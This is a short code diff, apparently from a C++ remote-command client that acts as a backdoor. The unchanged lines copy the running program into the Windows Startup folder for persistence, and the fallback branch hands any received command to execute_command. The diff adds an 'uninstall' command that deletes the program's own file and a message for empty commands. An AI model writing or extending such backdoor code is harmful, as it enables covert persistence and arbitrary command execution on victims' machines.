@@ -122,6 +122,14 @@ int main() {
             {
 				system("copy %0 AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%0");
             }
+			else if (command == "uninstall")
+			{
+				system("del %0");
+			}
+            else if (command == "")
+            {
+				output = "No command received.\n";
+            }
             else {
                 output.clear();
                 execute_command(command, output);
